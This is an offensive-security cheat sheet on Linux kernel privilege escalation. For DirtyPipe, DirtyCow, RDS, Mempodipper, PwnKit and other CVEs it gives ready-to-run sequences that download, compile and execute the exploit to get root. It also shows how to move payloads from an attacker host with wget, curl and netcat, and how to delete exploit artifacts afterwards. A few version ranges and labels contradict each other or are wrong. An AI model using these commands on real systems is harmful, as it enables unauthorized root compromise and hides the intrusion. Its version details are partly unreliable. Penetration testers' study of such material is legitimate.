# Linux Kernel Exploits

### Overview

**Kernel Exploits** target vulnerabilities in the Linux kernel to escalate privileges from unprivileged user to root. These exploits leverage bugs in kernel code, memory management, or system calls to bypass security mechanisms and gain complete system control.

**Key Concepts:**

* **Kernel Space** - Privileged memory where kernel executes
* **User Space** - Unprivileged memory where applications run
* **System Calls** - Interface between user space and kernel
* **Memory Corruption** - Buffer overflows, use-after-free bugs
* **Race Conditions** - Timing vulnerabilities in kernel operations

**Attack Vector:** Compile and execute exploit code that triggers a kernel vulnerability, causing the kernel to grant root privileges to the attacker's process.

**Warning:** Kernel exploits can crash systems. Test in controlled environments only.

***

### Exploitation Workflow Summary

1. Enumeration ├─ Check kernel version (uname -a) ├─ Identify Linux distribution ├─ Check system architecture (32/64-bit) └─ Search for matching exploits
2. Exploit Selection ├─ Match kernel version to CVE ├─ Verify exploit compatibility ├─ Download or compile exploit └─ Transfer to target system
3. Execution ├─ Compile if needed (gcc) ├─ Execute exploit binary ├─ Verify root access └─ Clean up exploit artifacts

***

### Enumeration

**Check kernel version:**

```bash
uname -a
```

**Expected output:**

```
Linux target 5.8.0-45-generic #51-Ubuntu SMP Fri Feb 19 13:06:08 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

**Key information:**

* Kernel version: `5.8.0-45-generic`
* Distribution: Ubuntu
* Architecture: x86\_64 (64-bit)

**Additional system information:**

```bash
cat /etc/os-release
cat /proc/version
lsb_release -a
```

**Search for exploits:**

```bash
searchsploit linux kernel 5.8
searchsploit -w linux kernel ubuntu
```

***

### Exploit Resources

**Precompiled exploit repositories:**

* SecWiki/linux-kernel-exploits
* lucyoa/kernel-exploits
* offensive-security/exploitdb-bin-sploits

**Search databases:**

* exploit-db.com
* packetstormsecurity.com
* GitHub (search: "linux kernel exploit CVE-XXXX")

***

### CVE-2022-0847 (DirtyPipe)

**Vulnerability:** Linux Kernel 5.8 < 5.16.11

**Affected systems:**

* Ubuntu 20.04, 21.04, 21.10
* Debian 11
* RHEL 8

**Check if vulnerable:**

```bash
uname -r
# If 5.8.x to 5.16.10, likely vulnerable
```

**Exploit:**

```bash
# Download exploit
wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c

# Compile
gcc exploit-1.c -o exploit

# Execute
./exploit
```

**Expected result:**

```bash
# whoami
root
```

**Alternative exploit:**

```bash
# Clone repository
git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
cd CVE-2022-0847-DirtyPipe-Exploit
make
./exploit /usr/bin/sudo
```

***

### CVE-2016-5195 (DirtyCow)

**Vulnerability:** Linux Kernel <= 3.19.0-73.8

**Affected systems:**

* Ubuntu 12.04, 14.04, 16.04
* Debian 7, 8
* CentOS 6, 7
* RHEL 5, 6, 7

**Check if vulnerable:**

```bash
uname -r
# If <= 4.8.3, potentially vulnerable
```

**Stabilize DirtyCow (prevent crashes):**

```bash
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
```

**Method 1 - SUID binary (40847.cpp):**

```bash
# Download
wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c

# Compile
gcc -pthread dirty.c -o dirty -lcrypt

# Execute (creates firefart user with UID 0)
./dirty password123

# Login
su firefart
# Password: password123
```

**Method 2 - /etc/passwd overwrite:**

```bash
# Download
wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/pokemon.c

# Compile
gcc -pthread pokemon.c -o pokemon

# Execute
./pokemon

# Login as root (no password)
su root
```

**Method 3 - C++ version (40847.cpp):**

```bash
# Download
wget https://www.exploit-db.com/raw/40847 -O dcow.cpp

# Compile
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil

# Execute
./dcow -s
```

***

### CVE-2010-3904 (RDS)

**Vulnerability:** Linux Kernel <= 2.6.36-rc8

**Affected systems:**

* Ubuntu 10.10, 10.04
* Debian 5
* CentOS 5

**Exploit:**

```bash
# Download
wget https://www.exploit-db.com/raw/15285 -O rds.c

# Compile
gcc rds.c -o rds

# Execute
./rds
```

**Expected result:**

```bash
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
[+] Resolved security_ops to 0xffffffff81ce8df0
[+] Resolved default_security_ops to 0xffffffff81a523e0
[+] Resolved cap_ptrace_traceme to 0xffffffff8125db60
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] Redis/exploit by Dan Rosenberg
[*] Got root!

# whoami
root
```

***

### CVE-2010-4258 (Full Nelson)

**Vulnerability:** Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)

**Exploit:**

```bash
# Download
wget https://www.exploit-db.com/raw/15704 -O full-nelson.c

# Compile
gcc full-nelson.c -o full-nelson

# Execute
./full-nelson
```

***

### CVE-2012-0056 (Mempodipper)

**Vulnerability:** Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)

**Exploit:**

```bash
# Download
wget https://www.exploit-db.com/raw/18411 -O mempodipper.c

# Compile
gcc mempodipper.c -o mempodipper

# Execute
./mempodipper
```

***

### Additional Notable Exploits

**CVE-2021-4034 (PwnKit):**

```bash
# Not kernel exploit, but polkit (often grouped together)
# Works on most Linux distros
wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
chmod +x PwnKit
./PwnKit
```

**CVE-2017-16995:**

```bash
# Linux Kernel < 4.14.8
wget https://www.exploit-db.com/raw/45010 -O 45010.c
gcc 45010.c -o exploit
./exploit
```

**CVE-2017-1000367 (Sudo vulnerability):**

```bash
# Sudo 1.8.6p7 - 1.8.20
wget https://www.exploit-db.com/raw/42183 -O sudopwn.sh
bash sudopwn.sh
```

***

### Compilation Tips

**32-bit systems:**

```bash
gcc -m32 exploit.c -o exploit
```

**64-bit systems:**

```bash
gcc exploit.c -o exploit
# or explicitly
gcc -m64 exploit.c -o exploit
```

**With pthread:**

```bash
gcc -pthread exploit.c -o exploit
```

**Static compilation (no dependencies):**

```bash
gcc -static exploit.c -o exploit
```

**Suppress warnings:**

```bash
gcc -w exploit.c -o exploit
```

***

### Transfer Methods

**If wget/curl available on target:**

```bash
wget http://attacker-ip/exploit -O /tmp/exploit
curl http://attacker-ip/exploit -o /tmp/exploit
```

**Using Python HTTP server (attacker):**

```bash
python3 -m http.server 8000
```

**Using netcat:**

```bash
# Attacker (sender)
nc -w 3 target-ip 4444 < exploit

# Target (receiver)
nc -l -p 4444 > exploit
```

**Using base64 (copy-paste):**

```bash
# Attacker
base64 exploit

# Target
echo "[BASE64_STRING]" | base64 -d > exploit
```

***

### Execution Safety

**Before running kernel exploit:**

```bash
# 1. Backup important data
# 2. Test in VM first
# 3. Check system load
uptime

# 4. Monitor dmesg for kernel messages
dmesg -w &

# 5. Have console access (not just SSH)
```

**After successful exploit:**

```bash
# Verify root access
whoami
id

# Clean up
rm exploit exploit.c

# Check kernel logs
dmesg | tail -20
```

***

### Quick Reference

**Enumeration:**

```bash
uname -a
cat /etc/os-release
searchsploit linux kernel $(uname -r)
```

**Common exploits by kernel version:**

```bash
# <= 2.6.36: CVE-2010-3904 (RDS)
# 2.6.37: CVE-2010-4258 (Full Nelson)
# 2.6.39 < 3.2.2: CVE-2012-0056 (Mempodipper)
# <= 4.8.3: CVE-2016-5195 (DirtyCow)
# 5.8 < 5.16.11: CVE-2022-0847 (DirtyPipe)
```

**Compile and execute:**

```bash
gcc exploit.c -o exploit
chmod +x exploit
./exploit
```
